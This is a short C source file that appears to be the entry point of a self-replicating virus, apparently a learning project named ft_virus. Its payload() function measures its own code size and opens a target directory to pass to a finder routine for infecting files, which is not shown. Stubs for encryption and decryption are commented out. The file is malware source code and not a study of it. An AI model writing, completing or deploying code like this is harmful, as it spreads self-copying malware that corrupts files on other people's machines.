#include "ft_virus.h"

char infested_dir[] STORE_VALUE = INFESTED_DIR;
char hello[] STORE_VALUE = "dir: ";
//char *infested_dir = "/tmp/";

void start(void)
{
	payload();
	EXIT(0);
}

void payload()
{
	t_data data;
	int fd;

	fd = 0xdeadbeaf;
	WRITE(1, hello, sizeof(hello) - 1);
	WRITE(1, infested_dir, sizeof(infested_dir) - 1);
	data.infos.pl_size = &payload_end - &payload;
	ft_putchar('1');
	ft_putchar(':');
	ft_putnbr(&payload_end - &payload);
	ft_putchar('\n');
	data.key = 0xdeadbeaf;
	data.decrypt_start = 0xdeadbeaf;
	//mprotect_us();
	//decrypt();
	fd = OPEN(infested_dir, O_RDONLY | O_DIRECTORY);
	if (fd == -1)
		return ;
	finder(data, fd);
	CLOSE(fd);
}

void payload_end(void)
{
	;
}

